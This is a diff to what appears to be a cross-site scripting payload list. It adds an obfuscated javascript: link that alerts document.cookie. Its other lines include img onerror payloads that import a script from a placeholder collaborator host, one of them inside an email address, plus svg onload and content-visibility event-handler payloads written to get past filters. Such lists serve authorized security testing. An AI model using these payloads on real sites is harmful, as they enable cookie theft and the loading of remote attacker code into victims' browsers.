@@ -1,6 +1,7 @@
 013371337;ext=<img/src/onerror=import('//COLLABORATOR-HERE/')>
 "><img/src/onerror=import('//COLLABORATOR-HERE/')>"@wearehackerone.com
 <a%20href=%0dj&Tab;avascript&colon;x='trela'.split('').reverse().join('');self[x](origin)>
+<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
 <svg onload="alert(1)" <="" svg=""
 <input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
 <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
